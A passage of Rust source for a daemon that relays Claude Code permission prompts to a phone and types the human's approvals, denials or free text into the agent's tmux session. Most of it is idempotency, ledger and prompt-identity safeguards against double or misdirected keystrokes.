                crate::log_info!("adopting session {session_id} as {uid}");
                uid
            }
        };

        // **An adopted run gets no tmux location, because it has none we know
        // of.** `claude:` is the prefix cc-hook mints for a session CodeConnect
        // did not launch; recording `codeconnect`/`<name>` for one — a server
        // and a name nothing ever created — is how the liveness sweep came to
        // read tmux's inevitable "no such session" as proof of death for runs
        // that were alive, marked them Exited, and let the phone delete them.
        // Empty is the honest answer: the daemon cannot say where, or whether,
        // this process runs. Hosted recreations — a `cc-*` name, or an exact
        // uid after a crash — keep the real location.
        let adopted = session_id.starts_with("claude:");
        let row = SessionRow {
            session_uid: uid.clone(),
            session_id: session_id.to_string(),
            tmux_session: existing
                .as_ref()
                .map(|r| r.tmux_session.clone())
                .unwrap_or_else(|| {
                    if adopted {
                        String::new()
                    } else {
                        session_id.to_string()
                    }
                }),
            tmux_socket: existing
                .as_ref()
                .map(|r| r.tmux_socket.clone())
                .unwrap_or_else(|| {
                    if adopted {
                        String::new()
                    } else {
                        protocol::TMUX_SOCKET_NAME.to_string()
                    }
                }),
            cwd: input
                .cwd
                .clone()
                .or_else(|| existing.as_ref().map(|r| r.cwd.clone()))
                .unwrap_or_default(),
            claude_session_id: input.session_id.clone(),
            transcript_path: input.transcript_path.clone(),
            lifecycle: Lifecycle::Live,
            created_at: existing
                .as_ref()
                .map(|r| r.created_at.clone())
                .unwrap_or_else(|| now.clone()),
            updated_at: now,
        };
        if self.db.upsert_session(row.clone()).await? == crate::store::SessionUpsert::Tombstoned {
            // The uid was deliberately deleted while this hook was in flight.
            // Nothing was written, so nothing may be set up either — no tail,
            // no key to file the event under. Dropping the hook is the honest
            // outcome — the user removed this run, and it stays removed — and
            // it is an expected outcome, not a failure, so it is reported as
            // one: `None`, logged at info, never an error.
            crate::log_info!(
                "session {uid} was deleted; dropping the hook that raced the deletion"
            );
            return Ok(None);
        }

        self.relabel_open_cards(&uid, &row.cwd).await;

        if let Some(path) = &input.transcript_path {
            let already = existing
                .as_ref()
                .and_then(|r| r.transcript_path.clone())
                .is_some_and(|known| &known == path);
            if !already {
                let _ = self.transcript_tx.send(crate::tailer::TailCommand::Follow {
                    session_uid: uid.clone(),
                    path: path.clone(),
                });
            }
        }
        Ok(Some(SessionKey::new(uid, session_id)))
    }

    /// The row a hook or a registration should continue, if there is one.
    ///
    /// An **exited** run is deliberately not continued when only a name is
    /// offered: `cc-1` having ended and `cc-1` having restarted look identical
    /// from the outside, and appending to the dead one is precisely the failure
    /// this prevents. With a uid in hand the row is taken as named, dead
    /// or alive — a supervisor reconnecting to report its own exit has to reach
    /// its own row.
    async fn lookup_run(
        &self,
        session_id: &str,
        session_uid: Option<&str>,
    ) -> Result<Option<SessionRow>> {
        if let Some(uid) = session_uid.filter(|uid| protocol::uid::is_well_formed(uid)) {
            return self.db.get_session(uid.to_string()).await;
        }
        Ok(self
            .db
            .find_session(session_id.to_string())
            .await?
            .filter(|row| row.lifecycle != Lifecycle::Exited))
    }

    /// Resolve whatever a client named — a uid or a tmux name — to a real run.
    ///
    /// A uid is exact. A **name** is not an identity, so it is resolved to the
    /// run a human means by it, in this order:
    ///
    /// 1. the one with a supervisor attached right now — the only positive
    ///    evidence of which run currently owns the name;
    /// 2. failing that, the store's policy — the newest run under that name.
    ///
    /// Two simple rules rather than one compound one, and neither of them reads
    /// `lifecycle`: a session that ended while the daemon was down was never
    /// observed exiting, so `lifecycle` says `Live` forever and ranking on it
    /// would put that ghost above the run that is genuinely there.
    pub async fn resolve(&self, reference: &str) -> Result<SessionRow> {
        if protocol::uid::is_well_formed(reference) {
            if let Some(row) = self.db.get_session(reference.to_string()).await? {
                return Ok(row);
            }
        }
        let attached: Option<SessionRow> = {
            let inner = self.inner.lock().await;
            self.store
                .list_sessions()?
                .into_iter()
                .filter(|row| {
                    row.session_id == reference && inner.supervisors.contains_key(&row.session_uid)
                })
                .max_by(|a, b| a.session_uid.cmp(&b.session_uid))
        };
        if let Some(row) = attached {
            return Ok(row);
        }
        self.store
            .find_session(reference)?
            .ok_or_else(|| anyhow!("unknown session {reference}"))
    }

    // --------------------------------------------------------------- answers

    /// Which run an answer is for.
    ///
    /// A `session_uid` settles it outright. Anything else — a bare tmux name, or
    /// nothing at all from a protocol-minor-1 client — is matched against the
    /// live approvals; if none matches (the card was answered and the entry is
    /// gone) the ledger is consulted, so a retried tap still gets its original
    /// outcome back.
    ///
    /// Two live approvals sharing a request id is the one case that cannot be
    /// worked out, and it is refused with an instruction rather than resolved by
    /// coin flip. That refusal covers the name-scoped case as well as the
    /// unscoped one: "the run called `cc-1`" is not an answer to "which of these
    /// two cards did the human tap", and typing into the wrong agent's TTY is
    /// not a mistake that can be taken back.
    async fn approval_target(
        &self,
        request_id: &str,
        session_ref: Option<&str>,
    ) -> std::result::Result<String, String> {
        // A **uid** is an identity: it names one run and there is nothing to
        // disambiguate.
        if let Some(uid) = session_ref.filter(|value| protocol::uid::is_well_formed(value)) {
            return match self.db.get_session(uid.to_string()).await {
                Ok(Some(row)) => Ok(row.session_uid),
                Ok(None) => Err(format!("unknown session {uid}")),
                Err(err) => Err(format!("session lookup failed: {err}")),
            };
        }

        // Everything else is a *name*, and a name is not an identity — whether
        // it arrived in `session_id` or not at all. So both cases get the same
        // ambiguity check: if this request id is open in more than one run, the
        // right answer cannot be worked out and must not be guessed at.
        //
        // The collision is not hypothetical. When a `PermissionRequest` has no
        // PreToolUse to correlate against, the request id falls back to
        // `pr-<prompt_id>-<hash>` and the hash covers only the tool and its
        // input — so two runs executing the same ordinary command produce the
        // same request id *and* the same payload hash, which means the staleness
        // guard downstream would not catch the mix-up either.
        let matches: Vec<String> = {
            let inner = self.inner.lock().await;
            inner
                .pending
                .iter()
                // `Option::is_none_or` would read better but was stabilised
                // after the toolchain this workspace declares support for.
                .filter(|((_, id), entry)| {
                    id == request_id
                        && match session_ref {
                            Some(name) => entry.session.name == name,
                            None => true,
                        }
                })
                .map(|((uid, _), _)| uid.clone())
                .collect()
        };
        match matches.len() {
            1 => return Ok(matches.into_iter().next().expect("length checked")),
            0 => {}
            _ => {
                return Err(
                    "this request id is open in more than one run of that name; \
                     answer with the session_uid the card came from"
                        .into(),
                )
            }
        }

        // No live approval matches. Either the card was already answered — in
        // which case the ledger replays its outcome — or the name is unknown.
        if let Some(name) = session_ref {
            if self
                .db
                .find_session(name.to_string())
                .await
                .ok()
                .flatten()
                .is_none()
            {
                return Err(format!("unknown session {name}"));
            }
        }
        match self.db.find_answer_by_request(request_id.to_string()).await {
            Ok(Some((uid, _, _))) => Ok(uid),
            Ok(None) => Err("unknown or already-resolved request".into()),
            Err(err) => Err(format!("ledger read failed: {err}")),
        }
    }

    /// Apply a phone answer. Idempotent by `(session, request_id)`, guarded by
    /// `payload_hash`.
    pub async fn answer(
        &self,
        request_id: &str,
        payload_hash: &str,
        decision: AnswerDecision,
        session_ref: Option<&str>,
    ) -> AnswerResult {
        let session_uid = match self.approval_target(request_id, session_ref).await {
            Ok(uid) => uid,
            Err(reason) => return AnswerResult::Rejected { reason },
        };
        let id: ApprovalId = (session_uid.clone(), request_id.to_string());

        // 0. Serialise on this one approval. Two taps arriving together used to
        //    make the second one a *rejection* ("already being applied"), which
        //    contradicts the rule that a duplicate returns the original
        //    outcome — and made a double-tap on a flaky link look like a
        //    failure. Waiting for the winner costs the injection's latency and
        //    turns the racer into a well-formed duplicate.
        let gate = {
            let mut inner = self.inner.lock().await;
            // Bounded: entries are dropped once nothing else holds them, so a
            // long-lived daemon does not accumulate one lock per approval ever
            // shown.
            inner
                .answer_locks
                .retain(|_, lock| Arc::strong_count(lock) > 1);
            Arc::clone(inner.answer_locks.entry(id.clone()).or_default())
        };
        let _serialised = gate.lock().await;

        // 1. Durable ledger wins over everything: an already-answered request is
        //    a no-op that replays the original outcome.
        match self
            .db
            .get_answer(session_uid.clone(), request_id.to_string())
            .await
        {
            Ok(Some((stored_hash, outcome))) => {
                // A superseded card was never *answered* — nothing was typed for
                // it — so replaying it as a duplicate would tell the phone its
                // tap had been applied. It is refused, and the refusal says what
                // to do instead.
                if outcome.resolved_by == ResolvedBy::Superseded {
                    return AnswerResult::Rejected {
                        reason: "this card was superseded by a newer prompt in the same run; \
                                 nothing was typed for it. Answer the current card."
                            .into(),
                    };
                }
                return AnswerResult::Duplicate {
                    outcome,
                    stale_payload_hash: stored_hash != payload_hash,
                };
            }
            Ok(None) => {}
            Err(err) => {
                crate::log_error!("ledger read failed: {err:#}");
                return AnswerResult::Rejected {
                    reason: "ledger unavailable".into(),
                };
            }
        }

        // 2. A claim with no terminal outcome means a previous attempt was cut
        //    off between typing and recording. Startup recovery normally turns
        //    those into terminal indeterminate outcomes; reaching one here means
        //    that did not happen, and the rule is the same either way — never
        //    type again on a question we cannot answer.
        match self
            .db
            .answer_claim(session_uid.clone(), request_id.to_string())
            .await
        {
            Ok(Some(claim)) => {
                crate::log_warn!(
                    "{request_id} carries an unsettled claim from {}; refusing to type again",
                    claim.started_at
                );
                self.settle_indeterminate(&claim).await;
                self.inner.lock().await.pending.remove(&id);
                return match self
                    .db
                    .get_answer(session_uid.clone(), request_id.to_string())
                    .await
                {
                    Ok(Some((stored_hash, outcome))) => AnswerResult::Duplicate {
                        outcome,
                        stale_payload_hash: stored_hash != payload_hash,
                    },
                    _ => AnswerResult::Rejected {
                        reason: "a previous attempt to apply this answer was interrupted and \
                                 whether it reached the agent is unknown; it will not be typed \
                                 again. Answer at the Mac."
                            .into(),
                    },
                };
            }
            Ok(None) => {}
            Err(err) => {
                crate::log_error!("claim read failed: {err:#}");
                return AnswerResult::Rejected {
                    reason: "ledger unavailable".into(),
                };
            }
        }

        // 3. Claim in memory so a local resolution racing us backs off, and
        //    check that this card is still the prompt on screen.
        let (session, card, responder, expect) = {
            let mut inner = self.inner.lock().await;
            let current = inner
                .prompt_generation
                .get(&session_uid)
                .copied()
                .unwrap_or(0);
            let Some(entry) = inner.pending.get_mut(&id) else {
                return AnswerResult::Rejected {
                    reason: "unknown or already-resolved request".into(),
                };
            };
            if entry.card.payload_hash != payload_hash {
                return AnswerResult::Rejected {
                    reason: "stale payload_hash: the card you answered is out of date".into(),
                };
            }
            // Belt and braces against the superseding sweep above: an entry that
            // was mid-injection when a newer prompt arrived is deliberately left
            // in place, and must still not be answerable afterwards.
            if entry.generation < current {
                return AnswerResult::Rejected {
                    reason: format!(
                        "this card is for prompt {} and the run is now on prompt {current}; \
                         nothing was typed. Answer the current card.",
                        entry.generation
                    ),
                };
            }
            entry.claimed = true;
            (
                entry.session.clone(),
                entry.card.clone(),
                entry.responder.take(),
                entry.prompt.clone(),
            )
        };

        // 4. Claim it durably, before a single key is sent. Without this a
        //    daemon killed mid-injection comes back with no record that anything
        //    was ever attempted, and the next tap types the answer a second time.
        let claim = AnswerClaim {
            session_uid: session.uid.clone(),
            session_id: session.name.clone(),
            request_id: request_id.to_string(),
            payload_hash: card.payload_hash.clone(),
            decision: serde_json::to_string(&decision).unwrap_or_default(),
            started_at: protocol::time::now_rfc3339(),
        };
        if let Err(err) = self.db.claim_answer(claim.clone()).await {
            crate::log_error!("could not claim {request_id} durably: {err:#}");
            let mut inner = self.inner.lock().await;
            if let Some(entry) = inner.pending.get_mut(&id) {
                entry.claimed = false;
            }
            return AnswerResult::Rejected {
                reason: "could not record that this answer is being applied; nothing was typed"
                    .into(),
            };
        }

        // 5. Apply.
        let (applied_via, detail) = match self
            .apply_decision(&session, &decision, responder, expect)
            .await
        {
            Actuation::Applied { via, detail } => (via, detail),
            // The supervisor said no *before* injecting, so we know nothing was
            // typed. The claim is released and the card is answerable again.
            Actuation::Refused(reason) => {
                let _ = self
                    .db
                    .release_answer_claim(session.uid.clone(), request_id.to_string())
                    .await;
                let mut inner = self.inner.lock().await;
                if let Some(entry) = inner.pending.get_mut(&id) {
                    entry.claimed = false;
                }
                return AnswerResult::Rejected { reason };
            }
            // A timeout, a dropped request, a supervisor that went away
            // mid-flight: it may have typed and it may not, and there is no
            // later evidence that can settle it. Releasing the claim here would
            // let the next tap type a second time into a live TTY — so the
            // claim becomes a terminal *indeterminate* outcome instead, exactly
            // as a restart would have recorded it.
            Actuation::Unknown(reason) => {
                crate::log_error!(
                    "{request_id}: the supervisor never confirmed the injection ({reason}); \
                     recording it as indeterminate rather than allowing a retry"
                );
                self.settle_indeterminate(&claim).await;
                self.inner.lock().await.pending.remove(&id);
                return match self
                    .db
                    .get_answer(session.uid.clone(), request_id.to_string())
                    .await
                {
                    Ok(Some((stored_hash, outcome))) => AnswerResult::Duplicate {
                        outcome,
                        stale_payload_hash: stored_hash != payload_hash,
                    },
                    _ => AnswerResult::Rejected {
                        reason: format!(
                            "the supervisor never confirmed this injection ({reason}); whether \
                             it reached the agent is unknown and it will not be typed again. \
                             Check the Mac."
                        ),
                    },
                };
            }
        };

        // 6. Record the terminal outcome, which also clears the claim.
        let mut outcome = AnswerOutcome {
            request_id: request_id.to_string(),
            session_id: session.name.clone(),
            decision: decision.clone(),
            resolved_by: ResolvedBy::Phone,
            applied_via,
            resolved_at: protocol::time::now_rfc3339(),
            detail,
            // Observed: we typed it, and the injection was confirmed.
            inferred: false,
            indeterminate: false,
        };
        let result =
            match self
                .store
                .record_answer(&session.uid, request_id, &card.payload_hash, &outcome)
            {
                Ok(LedgerWrite::Recorded) => AnswerResult::Applied {
                    outcome: outcome.clone(),
                },
                Ok(LedgerWrite::Existing {
                    outcome: original,
                    payload_hash: stored_hash,
                }) => AnswerResult::Duplicate {
                    outcome: original,
                    stale_payload_hash: stored_hash != payload_hash,
                },
                Err(err) => {
                    // The decision has already been typed into the TTY, and the
                    // supervisor confirmed it, so `Applied` is what happened.
                    // What is *not* true is that it was recorded — and the claim
                    // row surviving is what stops a retry typing it again.
                    crate::log_error!("ledger write failed after injection: {err:#}");
                    outcome.detail = Some(format!(
                        "{} (applied, but the durable record could not be written; a retry will \
                         be refused rather than re-applied)",
                        outcome.detail.as_deref().unwrap_or("typed into the prompt")
                    ));
                    AnswerResult::Applied {
                        outcome: outcome.clone(),
                    }
                }
            };

        // Dropped unconditionally, including on that ledger failure.
        //
        // With no ledger row, a later tap has nothing to be told it duplicates —
        // but the durable claim is still there, so it is told "interrupted,
        // outcome unknown" rather than being applied a second time.
        self.inner.lock().await.pending.remove(&id);
        let _ = self
            .db
            .delete_pending_approval(session.uid.clone(), request_id.to_string())
            .await;
        let resolved = PendingEvent::new(
            &session,
            EventKind::ApprovalResolved,
            serde_json::to_value(&outcome).unwrap_or(serde_json::Value::Null),
            Source::Daemon,
        )
        .with_source_event_id(format!("resolved:{request_id}"));
        if let Err(err) = self.ingest(resolved).await {
            crate::log_error!("failed to record resolution: {err:#}");
        }
        result
    }

    /// Apply the decision, and say which of three things happened.
    ///
    /// The three are not stylistic. "It was refused" and "we never found out"
    /// are the same `Err` to a caller that only has success and failure, and
    /// the caller has to tell them apart: a refusal means nothing was typed and
    /// the card may be answered again, while an unanswered request may have
    /// typed and must never be retried.
    ///
    /// `expect` is the prompt this card was bound to. Anything that answers the
    /// *prompt* (yes / escape / an option index) requires it, because those
    /// keystrokes are only meaningful against one specific prompt and are
    /// actively dangerous against a different one. A free-text takeover does
    /// not: it is not an answer to a prompt at all, and its interlock is the
    /// composer being ready to receive it.
    async fn apply_decision(
        &self,
        session: &SessionKey,
        decision: &AnswerDecision,
        responder: Option<oneshot::Sender<HookDecision>>,
        expect: Option<PromptFingerprint>,
    ) -> Actuation {
        // Structured return, when a hook is actually holding and the decision is
        // expressible as one. Cheaper and racier-proof than typing.
        if let Some(responder) = responder {
            let hook_decision = match decision {
                AnswerDecision::Allow => Some(HookDecision {
                    decision: Decision::Allow,
                    reason: Some("Approved from iPhone".into()),
                }),
                AnswerDecision::Deny => Some(HookDecision {
                    decision: Decision::Deny,
                    reason: Some("Denied from iPhone".into()),
                }),
                _ => None,
            };
            if let Some(hook_decision) = hook_decision {
                if responder.send(hook_decision).is_ok() {
                    return Actuation::Applied {
                        via: AnswerPath::HookReturn,
                        detail: Some("hook return".into()),
                    };
                }
            }
            // The hook already gave up; fall through to typing.
        }

        let (text, submit) = match decision {
            // Option 1 is the affirmative in Claude's permission prompt.
            AnswerDecision::Allow => ("1".to_string(), true),
            // Escape is the prompt's own cancel affordance ("Esc to cancel").
            // Option indices for "No" vary with the suggestions Claude offers,
            // so guessing one would risk selecting "always allow".
            AnswerDecision::Deny => ("\u{1b}".to_string(), false),
            AnswerDecision::Option { index } => (index.to_string(), true),
            AnswerDecision::Text { text } => (text.clone(), true),
        };

        let answers_the_prompt = !matches!(decision, AnswerDecision::Text { .. });
        let require = self.with_needle_overrides(if answers_the_prompt {
            PromptPresence::PermissionPrompt
        } else {
            PromptPresence::InputBox
        });

        let expect = if answers_the_prompt {
            // The whole rule in one place: no identity, no keystroke.
            // "1" typed at a prompt we cannot recognise is a yes to a question
            // nobody read, and the person at the Mac can see the screen.
            let Some(expect) = expect else {
                return Actuation::Refused(
                    "the prompt this card was created for could not be identified on screen, \
                     so nothing was typed. Answer at the Mac."
                        .into(),
                );
            };
            match self.supervisor_minor(&session.uid).await {
                // Too old to honour the fingerprint: it would accept the field
                // and drop it, so the injection would look checked and be
                // unchecked.
                Some(minor) if minor < SUPERVISOR_MINOR_PROMPT_IDENTITY => {
                    return Actuation::Refused(
                        "this session's supervisor predates prompt identity (restart the \
                         session to pick up the current build); nothing was typed"
                            .into(),
                    );
                }
                Some(_) => {}
                // No supervisor at all. Deliberately *not* reported here: the
                // request path says "no supervisor attached", which is the
                // actual reason, and answering with a version complaint would
                // send somebody looking for the wrong problem.
                None => {}
            }
            Some(expect)
        } else {
            None
        };

        let respond_by = match respond_by_stamp(self.config.supervisor_timeout_ms) {
            Ok(stamp) => stamp,
            // Never handed to a supervisor, so it cannot have typed — the
            // same refusal shape the NotSent arm below produces.
            Err(SupervisorFailure::NotSent(reason))
            | Err(SupervisorFailure::Unanswered(reason)) => {
                // The helper's reason already ends with "nothing was typed".
                return Actuation::Refused(reason);
            }
        };
        match self
            .supervisor_request(
                &session.uid,
                SupervisorRequest::SendText {
                    text,
                    require,
                    // Which target this is aimed at, and it decides whether the
                    // keyboard is asked about. An answer goes to the prompt,
                    // which legitimately has no cursor of its own. Free text
                    // goes to the composer, and a composer without the cursor is
                    // drawn and dead — see `authorise` in the supervisor.
                    targets_composer: !answers_the_prompt,
                    // No recovery on this path, so nothing to guard.
                    asking: None,
                    // The moment this daemon stops waiting for the answer,
                    // stamped so the supervisor spends its budget against the
                    // clock that actually matters — including whatever time
                    // this request spends queued before it is read.
                    respond_by_monotonic_ms: Some(respond_by),
                    submit,
                    expect,
                    // An answer to a permission prompt is never a slash
                    // command, and the prompt it answers is not a view the
                    // daemon may Escape away.
                    recover_composer: false,
                    capture_recovered: false,
                    confirm_view: None,
                },
            )
            .await
        {
            Ok(SupervisorResult::Sent { matched }) => Actuation::Applied {
                via: AnswerPath::SendKeys,
                detail: Some(matched),
            },
            // A refusal is a *positive* statement that nothing was typed: the
            // supervisor checks before it injects and never after.
            Ok(SupervisorResult::Refused { reason }) => {
                Actuation::Refused(format!("refused: {reason}"))
            }
            Ok(other) => Actuation::Unknown(format!("unexpected supervisor result: {other:?}")),
            // Never handed to a supervisor at all, so it cannot have typed.
            Err(SupervisorFailure::NotSent(reason)) => {
                Actuation::Refused(format!("{reason}; nothing was typed"))
            }
            // Sent and never answered. It may have typed before it stopped
            // answering, and nothing that happens later can settle that — so
            // this is never treated as "nothing happened", which is what would
            // let the next tap type again.
            Err(SupervisorFailure::Unanswered(reason)) => Actuation::Unknown(reason),
        }
    }

    /// What the supervisor for this run can honour, or `None` if there is none.
    ///
    /// A supervisor from before minor 3 accepts the fingerprint field and
    /// ignores it — serde drops what it does not know — so sending an approval
    /// to one would look like a checked injection and be an unchecked one. That
    /// is a different problem from having no supervisor at all, and the two get
    /// different answers.
    async fn supervisor_minor(&self, session_uid: &str) -> Option<u32> {
        self.inner
            .lock()
            .await
            .supervisors
            .get(session_uid)
            .map(|handle| handle.protocol_minor)
    }

    /// Resolve configured needle overrides into the request itself, so the
    /// supervisor stays dumb and the operator can fix a broken presence check
    /// (Claude's TUI copy is the most churn-prone thing we depend on) by
    /// editing one config file instead of shipping a release.
    /// The operator's configured prompt needles, or `None` when they have
    /// configured none. Deliberately not the *default* permission needles:
    /// those include `esctocancel`, which Claude's views offer too, so
    /// handing them to recovery's guard would stop it rescuing the measured
    /// lockout. See `SupervisorRequest::SendText::asking`.
    fn configured_prompt_presence(&self) -> Option<PromptPresence> {
        self.config
            .permission_prompt_needles()
            .map(|needles| PromptPresence::AnyOf {
                needles: needles.to_vec(),
            })
    }

    fn with_needle_overrides(&self, presence: PromptPresence) -> PromptPresence {
        let overrides = match presence {
            PromptPresence::InputBox => self.config.input_box_needles(),
            PromptPresence::PermissionPrompt => self.config.permission_prompt_needles(),
            PromptPresence::AnyOf { .. } => return presence,
        };
        match overrides {
            Some(needles) => PromptPresence::AnyOf {
                needles: needles.to_vec(),
            },
            None => presence,
        }
    }

    /// Free-text takeover from the phone. `session_ref` is a uid or a name.
    ///
    /// A mutation with an identity, so a phone on a flaky link can retry the
    /// same takeover without typing it twice. Three things changed in minor 3
    /// and all three are load-bearing:
    ///
    /// * The **server** picks the interlock. Letting the caller nominate the
    ///   needle that authorises its own keystrokes (`PromptPresence::AnyOf`)
    ///   made the safety check something the client could write for itself,
    ///   which is not a safety check.
    /// * The body is **bounded**. A megabyte typed into a TTY is not a takeover.
    /// * The mutation is **claimed durably before anything is typed**, so a
    ///   retry after a crash is told "unknown" rather than typing again.
    pub async fn send_text(
        &self,
        session_ref: &str,
        text: String,
        request_id: Option<&str>,
        payload_hash: Option<&str>,
        submit: bool,
        // The client's statement that a human saw this command's consequences
        // and tapped anyway. Never sufficient on its own — see `confirm_view`.
        complete_native_confirmation: bool,
    ) -> SendTextResult {
        if text.len() > protocol::ws::MAX_SEND_TEXT_BYTES {
            return SendTextResult::Refused {
                reason: format!(
                    "text is {} bytes; the ceiling is {}",
                    text.len(),
                    protocol::ws::MAX_SEND_TEXT_BYTES
                ),
            };
        }
        let session_uid = match self.resolve(session_ref).await {
            Ok(row) => row.session_uid,
            Err(err) => {
                return SendTextResult::Refused {
                    reason: format!("{err}"),
                }
            }
        };

        // The identity, if the client offered one. A `request_id` without a
        // hash is refused rather than trusted: the id alone says "this is a
        // retry" without saying a retry *of what*, and the ledger would then
        // happily suppress a completely different takeover.
        let identity = match (request_id, payload_hash) {
            (Some(request_id), Some(given)) => {
                let expected = protocol::hash::send_text_hash(session_ref, &text, submit);
                if !constant_time_eq(given.as_bytes(), expected.as_bytes()) {
                    return SendTextResult::Refused {
                        reason: "payload_hash does not match the text, session and submit flag \
                                 in this request"
                            .into(),
                    };
                }
                Some((request_id.to_string(), expected))
            }
            (Some(_), None) => {
                return SendTextResult::Refused {
                    reason: "request_id without payload_hash: an idempotent mutation has to say \
                             what it is a retry of"
                        .into(),
                }
            }
            (None, _) => None,
        };

        if let Some((request_id, hash)) = &identity {
            match self
                .db
                .claim_text_mutation(
                    session_uid.clone(),
                    request_id.to_string(),
                    hash.to_string(),
                    protocol::time::now_rfc3339(),
                )
                .await
            {
                Ok(TextClaim::Claimed) => {}
                Ok(TextClaim::Applied {
                    matched,
                    settled_at,
                }) => {
                    return SendTextResult::Duplicate {
                        matched,
                        applied_at: settled_at,
                    }
                }
                Ok(TextClaim::Indeterminate { started_at }) => {
                    return SendTextResult::Indeterminate {
                        reason: format!(
                            "a previous attempt at this mutation (claimed {started_at}) was \
                             interrupted; whether it reached the agent was never observed, and \
                             it will not be typed again"
                        ),
                    }
                }
                Ok(TextClaim::Conflict) => {
                    return SendTextResult::Refused {
                        reason: "this request_id was already used for different text in this \
                                 session; use a new one"
                            .into(),
                    }
                }
                Err(err) => {
                    crate::log_error!("could not claim send_text {request_id}: {err:#}");
                    return SendTextResult::Refused {
                        reason: "could not record that this mutation is being applied; nothing \
                                 was typed"
                            .into(),
                    };
                }
            }
        } else {
            crate::log_debug!(
                "send_text for {session_uid} carries no request_id; a retry of it would type twice"
            );
        }

        // Chosen here, never by the caller. Config overrides still apply — those
        // come from the operator's own file, not from the wire.
        let require = self.with_needle_overrides(PromptPresence::InputBox);
        // Both decided here rather than trusted from the phone: recovery is
        // safety behaviour, and the snapshot allowlist is what keeps this
        // from becoming a general "screenshot any TUI view" facility.
        let recover_composer = is_word_shaped_slash_command(&text);
        let capture_recovered = snapshot_command(&text);
        // **The one place a rescue becomes a completion.** Here the view is
        // not an ambush: it is Claude Code asking the human to confirm the
        // choice they already made on the phone, and dismissing it throws that
        // choice away. Everything else keeps the generic rescue.
        //
        // Three things must agree, and the client is only one of them. The
        // client's flag says a human was shown what this costs and tapped
        // anyway — a client that predates that disclosure sends `false` and
        // gets today's behaviour. The daemon's own allowlist says which
        // commands may ever be completed, so the flag can never nominate one.
        // The supervisor gate keeps a build that would silently drop the field
        // — and therefore Escape — from being handed a confirmation to make.
        // Consent and the allowlist decide here; the supervisor's capability
        // is decided in `supervisor_request`, against the handle that actually
        // receives the frame.
        let confirm_view = confirm_view_for(&text, complete_native_confirmation);
        let outcome = match respond_by_stamp(self.config.supervisor_timeout_ms) {
            Err(refused) => Err(refused),
            Ok(respond_by) => {
                self.supervisor_request(
                    &session_uid,
                    SupervisorRequest::SendText {
                        text,
                        require,
                        // This text goes to the composer, whatever needles the
                        // operator configured for finding it — so the supervisor
                        // may ask whether the composer has the keyboard.
                        targets_composer: true,
                        // And whatever they configured for recognising a prompt,
                        // so recovery's "never Escape a screen that is asking"
                        // guard sees the prompts they taught us to see. `None`
                        // when nothing is configured; the supervisor then uses
                        // the question itself.
                        asking: self.configured_prompt_presence(),
                        submit,
                        // Free text is not an answer to a prompt; the composer being
                        // ready is the whole interlock, and a permission prompt on
                        // screen makes that check fail on its own.
                        expect: None,
                        recover_composer,
                        capture_recovered,
                        confirm_view,
                        // The moment this daemon stops waiting for the answer,
                        // stamped so the supervisor spends its budget against the
                        // clock that actually matters — including whatever time
                        // this request spends queued before it is read.
                        respond_by_monotonic_ms: Some(respond_by),
                    },
                )
                .await
            }
        };

        let result = send_text_result_of(outcome);

        if let Some((request_id, _)) = &identity {
            match &result {
                // The three outcomes that prove the keys landed. Settling all
                // three is what makes a lost response replay as `duplicate`
                // instead of a permanent unknown: recovery and loss are as
                // final as a plain send — the typing happened, and no retry
                // may type it again.
                SendTextResult::Sent { matched }
                | SendTextResult::ComposerRecovered { matched, .. }
                | SendTextResult::ComposerLost { matched } => {
                    // Injected text landed at the prompt: the human moved the
                    // run, and the ambient latch must not swallow what follows.
                    self.push_gate.note_progress(&session_uid);
                    if let Err(err) = self
                        .db
                        .settle_text_mutation(
                            session_uid.clone(),
                            request_id.to_string(),
                            matched.to_string(),
                            protocol::time::now_rfc3339(),
                        )
                        .await
                    {
                        // The claim stays `applying`, so a retry is told
                        // "unknown" rather than typing a second time.
                        crate::log_error!("could not settle send_text {request_id}: {err:#}");
                    }
                }
                // Nothing was typed, so the claim is released and a later retry
                // is a fresh attempt rather than a permanent "I do not know".
                SendTextResult::Refused { .. } => {
                    if let Err(err) = self
                        .db
                        .release_text_mutation(session_uid.clone(), request_id.to_string())
                        .await
                    {
                        crate::log_error!("could not release send_text {request_id}: {err:#}");
                    }
                }
                // Left claimed on purpose: an unconfirmed injection must not
                // become answerable again.
                _ => crate::log_error!(
                    "send_text {request_id} was never confirmed; leaving it claimed so a retry \
                     is told so rather than typing again"
                ),
            }
        }
        result
    }

    pub async fn capture(&self, session_ref: &str, lines: u32) -> Result<String> {
        let session_uid = self.resolve(session_ref).await?.session_uid;
        self.capture_run(&session_uid, lines).await
    }

    /// Which slash commands this session's Claude Code has, from the binary
    /// itself. `Unavailable` is a complete answer — the phone falls back to
    /// its conservative static policy — so every failure path returns one
    /// with its reason rather than an error.
    pub async fn command_catalog(&self, session_ref: &str) -> protocol::ws::CommandCatalogResult {
        use protocol::ws::CommandCatalogResult;

        let row = match self.resolve(session_ref).await {
            Ok(row) => row,
            Err(err) => {
                return CommandCatalogResult::Unavailable {
                    reason: format!("{err}"),
                }
            }
        };
        let claude_bin = {
            let inner = self.inner.lock().await;
            inner
                .supervisors
                .get(&row.session_uid)
                .and_then(|handle| handle.claude_bin.clone())
        };
        let Some(claude_bin) = claude_bin else {
            // An adopted run, an exited one, or a supervisor predating the
            // field: nothing to probe, and guessing at a path would answer
            // for a binary this session never ran.
            return CommandCatalogResult::Unavailable {
                reason: "this session did not report its Claude Code binary".into(),
            };
        };
        let bin_path = std::path::PathBuf::from(&claude_bin);
        let fingerprint = match crate::catalog::fingerprint(&bin_path) {
            Ok(fingerprint) => fingerprint,
            Err(err) => {
                return CommandCatalogResult::Unavailable {
                    reason: format!("{err:#}"),
                }
            }
        };

        // Singleflight: the per-fingerprint lock is held across the cache
        // re-check and the probe, so a second asker waits for the first's
        // answer instead of spawning a second child.
        let flight = {
            let mut inner = self.inner.lock().await;
            inner
                .catalog_probes
                .entry(fingerprint.clone())
                .or_insert_with(|| Arc::new(Mutex::new(())))
                .clone()
        };
        let guard = flight.lock().await;
        let result = self
            .command_catalog_locked(&fingerprint, &bin_path, &row.cwd)
            .await;
        drop(guard);
        // The flight entry has done its job on every path; the caches carry
        // the answer.
        self.inner.lock().await.catalog_probes.remove(&fingerprint);
        result
    }

    /// The half that runs under the fingerprint's flight lock.
    async fn command_catalog_locked(
        &self,
        fingerprint: &str,
        bin_path: &std::path::Path,
        cwd: &str,
    ) -> protocol::ws::CommandCatalogResult {
        use protocol::ws::CommandCatalogResult;

        /// How long a failed probe answers for its fingerprint. Long enough
        /// that the waiters queued behind one failure share it instead of
        /// each spawning a child; short enough that a fixed binary or a
